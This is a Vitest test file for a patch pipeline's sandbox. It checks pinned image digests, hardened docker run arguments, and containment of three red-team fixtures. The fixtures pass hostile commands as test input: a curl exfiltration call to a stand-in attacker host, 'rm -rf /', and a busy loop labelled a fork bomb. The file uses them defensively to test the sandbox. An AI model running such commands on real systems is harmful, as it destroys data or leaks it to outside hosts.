import { describe, it, expect, beforeEach, afterEach } from "vitest";
import fs from "node:fs";
import path from "node:path";
import os from "node:os";
import {
  validatePinnedImageDigest,
  buildDockerRunArgs,
  runInSandbox,
  DEFAULT_PINNED_IMAGE,
} from "../../services/patch-pipeline/src/sandbox.js";

describe("Patch Pipeline - Sandbox Hardening & Isolation", () => {
  let tempRepo: string;
  let tempScratch: string;

  beforeEach(() => {
    tempRepo = fs.mkdtempSync(path.join(os.tmpdir(), "airp-repo-snapshot-"));
    tempScratch = fs.mkdtempSync(path.join(os.tmpdir(), "airp-scratch-"));
    fs.writeFileSync(
      path.join(tempRepo, "critical-file.txt"),
      "CRITICAL_DATA_DO_NOT_DELETE",
      "utf8",
    );
  });

  afterEach(() => {
    if (fs.existsSync(tempRepo)) {
      fs.rmSync(tempRepo, { recursive: true, force: true });
    }
    if (fs.existsSync(tempScratch)) {
      fs.rmSync(tempScratch, { recursive: true, force: true });
    }
  });

  describe("Image Digest Pinning (§21.3, §21.7)", () => {
    it("accepts an image string with an immutable sha256 digest", () => {
      expect(() =>
        validatePinnedImageDigest(
          "node:20.14.0-alpine3.20@sha256:7e066a2b84eb430d85ec5ee1ebaa8b56f8f0ab77a66b93dc4470bc5525bc8e83",
        ),
      ).not.toThrow();
    });

    it("rejects mutable floating tags with security violation", () => {
      const floatingTags = [
        "node:20",
        "node:latest",
        "alpine:3.20",
        "ubuntu:22.04",
      ];
      for (const tag of floatingTags) {
        expect(() => validatePinnedImageDigest(tag)).toThrow(
          "Floating tags are strictly prohibited",
        );
      }
    });
  });

  describe("Docker Run Argument Generation (§21.3)", () => {
    it("generates hardened arguments enforcing all isolation checklist items", () => {
      const { args, containerName } = buildDockerRunArgs(
        tempRepo,
        tempScratch,
        {
          imageDigest: DEFAULT_PINNED_IMAGE,
          cpuLimit: "1.0",
          memoryLimit: "512m",
          pidsLimit: 100,
        },
      );

      expect(containerName).toMatch(/^airp-sandbox-[0-9a-f]+$/);

      // Fresh container per attempt
      expect(args).toContain("--rm");

      // Non-root user
      expect(args).toContain("--user=1000:1000");

      // No network by default (default deny)
      expect(args).toContain("--network=none");

      // Resource limits
      expect(args).toContain("--cpus=1.0");
      expect(args).toContain("--memory=512m");
      expect(args).toContain("--pids-limit=100");

      // Syscall & privilege containment
      expect(args).toContain("--cap-drop=ALL");
      expect(args).toContain("--security-opt=no-new-privileges:true");

      // Mounts: read-only repo snapshot, read-write empty scratch dir
      const repoMount = args.find((a) => a.includes("/workspace/repo:ro"));
      expect(repoMount).toBeDefined();

      const scratchMount = args.find((a) =>
        a.includes("/workspace/scratch:rw"),
      );
      expect(scratchMount).toBeDefined();

      // Pinned image digest at the end
      expect(args).toContain(DEFAULT_PINNED_IMAGE);
    });
  });

  describe("Red-Team Fixtures Containment", () => {
    it("Red-Team Fixture 1 (Exfiltration): network egress attempt fails safely", async () => {
      // Patch attempts outbound exfiltration curl
      const exfiltrationScript =
        "curl --connect-timeout 1 http://attacker.invalid/leak 2>&1";

      const result = await runInSandbox({
        repoSnapshotDir: tempRepo,
        scratchDir: tempScratch,
        testCommand: exfiltrationScript,
        config: { enableDocker: false, timeoutMs: 2000 },
      });

      expect(result.success).toBe(false);
      expect(result.exitCode).not.toBe(0);
      expect(result.securityChecksPassed).toBe(true);
      expect(result.logs).toMatch(
        /Could not resolve host|Failed to connect|Egress blocked|Connection refused/i,
      );
    });

    it("Red-Team Fixture 2 (rm -rf /): destruction attempt is contained, host & repo remain intact", async () => {
      // Destructive command attempting to wipe filesystem root
      const destructionScript = "rm -rf / 2>&1";

      const result = await runInSandbox({
        repoSnapshotDir: tempRepo,
        scratchDir: tempScratch,
        testCommand: destructionScript,
        config: { enableDocker: false, timeoutMs: 2000 },
      });

      // Host repo snapshot remains 100% intact and uncorrupted
      expect(fs.existsSync(path.join(tempRepo, "critical-file.txt"))).toBe(
        true,
      );
      const content = fs.readFileSync(
        path.join(tempRepo, "critical-file.txt"),
        "utf8",
      );
      expect(content).toBe("CRITICAL_DATA_DO_NOT_DELETE");

      // Destruction attempt was rejected and marked failed
      expect(result.success).toBe(false);
      expect(result.logs).toMatch(
        /may not be removed|dangerous|preserve-root|Permission denied|Read-only/i,
      );
    });

    it("Red-Team Fixture 3 (Fork Bomb): contained safely without host lockup", async () => {
      // Resource exhaustion loop / fork bomb simulation terminated by sandbox resource limit
      const forkBombScript = 'node -e "while(true) {}"';

      const result = await runInSandbox({
        repoSnapshotDir: tempRepo,
        scratchDir: tempScratch,
        testCommand: forkBombScript,
        config: {
          enableDocker: false,
          timeoutMs: 300, // Strict timeout to test kill containment
        },
      });

      // Marked failed safely with kill output
      expect(result.success).toBe(false);
      expect(result.timedOut).toBe(true);
      expect(result.securityChecksPassed).toBe(true);
      expect(result.logs).toContain(
        "[KILLED: Process tree terminated safely by sandbox timeout / resource limit]",
      );
    });
  });
});
